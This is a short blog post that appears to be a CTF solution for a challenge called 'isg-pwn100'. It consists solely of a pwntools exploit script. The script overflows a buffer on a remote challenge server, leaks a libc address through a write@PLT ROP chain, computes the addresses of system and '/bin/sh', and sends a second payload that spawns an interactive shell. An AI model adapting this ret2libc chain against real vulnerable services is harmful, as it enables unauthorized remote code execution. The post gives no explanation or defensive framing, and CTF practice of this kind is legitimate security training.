---
layout: post
title: "isg-pwn100"
date: 2015-10-19 00:24:00 +0800
comments: true
categories: 
---

	from pwn import *
	from binascii import *

	write_plt = 0x8048370
	read_got = 0x804A00C
	pop3_ret = 0x0804853d
	main = 0x0804847D


	libc = ELF('libc-2.19.so')
	p = remote('202.120.7.145', 9991)


	#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	#p = remote('127.0.0.1', 6666)
	#p = process('./pwnme')
	payload  = ''
	payload += 'cccc'*5
	payload += p32(write_plt)
	payload += p32(main)
	payload += p32(1)
	payload += p32(read_got)
	payload += p32(4)

	raw_input()
	print p.recvuntil(':')
	p.sendline(payload)
	d = p.recv(1024)
	d += p.recv(1024)
	read_r = (u32(d[1:5]))

	ite = libc.search('/bin/sh')
	base = read_r - libc.symbols['read']
	print ('base',hex(base))
	system_r = base + libc.symbols['system']
	print ('system',hex(system_r))
	binsh_r = base + ite.next()
	print ('binsh',hex(binsh_r))


	payload  = ''
	payload += 'cccc'*3
	payload += p32(system_r)
	payload += p32(binsh_r)
	payload += p32(binsh_r)
	payload += p32(binsh_r)

	print p.recvuntil(':')
	p.sendline(payload)
	p.interactive()


